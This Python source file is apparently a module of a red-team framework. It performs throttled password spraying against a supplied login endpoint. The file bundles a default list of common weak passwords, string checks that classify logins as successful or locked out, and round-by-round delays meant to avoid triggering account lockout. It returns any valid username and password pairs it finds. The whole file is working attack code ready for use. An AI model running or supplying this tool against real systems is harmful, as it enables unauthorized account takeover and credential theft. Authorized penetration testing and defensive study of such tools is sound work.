"""Password Spray Module.

Perform throttled password spraying attacks against login endpoints
with lockout-awareness and common password list support.
"""

import asyncio
import time
from datetime import datetime
from typing import Any, Dict, List, Tuple

import aiohttp

from src.core.base_module import (
    AtsModule,
    ModuleSpec,
    ModuleCategory,
    Parameter,
    ParameterType,
    OutputField,
)

# Common weak passwords used in spray attacks
DEFAULT_PASSWORDS = [
    "Password1", "Password123", "Welcome1", "Welcome123",
    "Spring2024", "Summer2024", "Fall2024", "Winter2024",
    "Company123", "Changeme1", "P@ssw0rd", "Password1!",
    "Qwerty123", "Admin123", "Letmein1", "abc123!",
]

# Indicators of successful authentication vs failure
SUCCESS_INDICATORS = ["dashboard", "welcome", "token", "session", "authenticated", "success"]
LOCKOUT_INDICATORS = ["locked", "too many", "rate limit", "temporarily disabled", "try again later"]


class PasswordSprayModule(AtsModule):
    """Password spraying attack against login endpoints."""

    def get_spec(self) -> ModuleSpec:
        return ModuleSpec(
            name="password_spray",
            category=ModuleCategory.RED_TEAM,
            description="Throttled password spraying against login endpoints with lockout detection",
            version="1.0.0",
            parameters=[
                Parameter(
                    name="target",
                    type=ParameterType.URL,
                    description="Login endpoint URL to test against",
                    required=True,
                ),
                Parameter(
                    name="usernames",
                    type=ParameterType.LIST,
                    description="List of usernames to spray",
                    required=True,
                ),
                Parameter(
                    name="passwords",
                    type=ParameterType.LIST,
                    description="List of passwords to try (uses built-in list if empty)",
                    required=False,
                    default=[],
                ),
                Parameter(
                    name="delay_seconds",
                    type=ParameterType.INTEGER,
                    description="Delay in seconds between each spray round to avoid lockout",
                    required=False,
                    default=30,
                    min_value=1,
                    max_value=3600,
                ),
                Parameter(
                    name="username_field",
                    type=ParameterType.STRING,
                    description="Form field name for the username parameter",
                    required=False,
                    default="username",
                ),
                Parameter(
                    name="password_field",
                    type=ParameterType.STRING,
                    description="Form field name for the password parameter",
                    required=False,
                    default="password",
                ),
            ],
            outputs=[
                OutputField(name="valid_credentials", type="list", description="Successfully sprayed credentials"),
                OutputField(name="lockouts_detected", type="list", description="Accounts that triggered lockout"),
                OutputField(name="summary", type="dict", description="Spray attack summary"),
            ],
            tags=["red_team", "password", "spray", "brute_force", "authentication"],
            dangerous=True,
        )

    def validate_inputs(self, config: Dict[str, Any]) -> Tuple[bool, str]:
        if not config.get("target"):
            return False, "Target login endpoint URL is required"
        if not config.get("usernames"):
            return False, "At least one username is required"
        target = config["target"]
        if not target.startswith(("http://", "https://")):
            return False, "Target must be a valid HTTP/HTTPS URL"
        return True, ""

    async def _attempt_login(self, session: aiohttp.ClientSession, url: str,
                             username: str, password: str,
                             username_field: str, password_field: str) -> Dict[str, Any]:
        """Attempt a single login and classify the response."""
        payload = {username_field: username, password_field: password}
        result = {
            "username": username,
            "password": password,
            "success": False,
            "locked_out": False,
            "status_code": None,
            "error": None,
        }
        try:
            async with session.post(url, data=payload, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                result["status_code"] = resp.status
                body = await resp.text()
                body_lower = body.lower()

                # Check for lockout
                if any(indicator in body_lower for indicator in LOCKOUT_INDICATORS):
                    result["locked_out"] = True
                    return result

                # Check for success: 302 redirect or success indicators
                if resp.status in (302, 303):
                    result["success"] = True
                elif resp.status == 200 and any(ind in body_lower for ind in SUCCESS_INDICATORS):
                    result["success"] = True

        except asyncio.TimeoutError:
            result["error"] = "Connection timed out"
        except aiohttp.ClientError as e:
            result["error"] = str(e)

        return result

    async def execute(self, config: Dict[str, Any]) -> Dict[str, Any]:
        target_url = config["target"].strip()
        usernames = [u.strip() for u in config["usernames"] if u.strip()]
        passwords = config.get("passwords") or DEFAULT_PASSWORDS
        passwords = [p.strip() for p in passwords if p.strip()]
        delay_seconds = config.get("delay_seconds", 30)
        username_field = config.get("username_field", "username")
        password_field = config.get("password_field", "password")

        self.logger.info("password_spray_start", target=target_url, users=len(usernames), passwords=len(passwords))

        valid_credentials: List[Dict[str, str]] = []
        lockouts_detected: List[str] = []
        locked_accounts: set = set()
        total_attempts = 0
        start_time = time.time()

        async with aiohttp.ClientSession() as session:
            # Spray one password across all users before moving to next password
            for pwd_idx, password in enumerate(passwords):
                round_results = []
                for username in usernames:
                    if username in locked_accounts:
                        continue

                    result = await self._attempt_login(
                        session, target_url, username, password, username_field, password_field
                    )
                    total_attempts += 1

                    if result["locked_out"]:
                        locked_accounts.add(username)
                        if username not in lockouts_detected:
                            lockouts_detected.append(username)
                        self.logger.warning("account_lockout_detected", username=username)

                    if result["success"]:
                        valid_credentials.append({"username": username, "password": password})
                        self.logger.info("valid_credential_found", username=username)

                    round_results.append(result)

                # Throttle between password rounds (except after the last)
                if pwd_idx < len(passwords) - 1:
                    self.logger.info("spray_round_delay", delay=delay_seconds, round=pwd_idx + 1)
                    await asyncio.sleep(delay_seconds)

                # Abort if all accounts are locked
                if locked_accounts >= set(usernames):
                    self.logger.warning("all_accounts_locked_aborting")
                    break

        elapsed = round(time.time() - start_time, 2)

        summary = {
            "target": target_url,
            "total_usernames": len(usernames),
            "total_passwords": len(passwords),
            "total_attempts": total_attempts,
            "valid_credentials_found": len(valid_credentials),
            "lockouts_triggered": len(lockouts_detected),
            "elapsed_seconds": elapsed,
            "completed_at": datetime.utcnow().isoformat(),
        }

        self.logger.info("password_spray_complete", found=len(valid_credentials), lockouts=len(lockouts_detected))

        return {
            "valid_credentials": valid_credentials,
            "lockouts_detected": lockouts_detected,
            "summary": summary,
        }
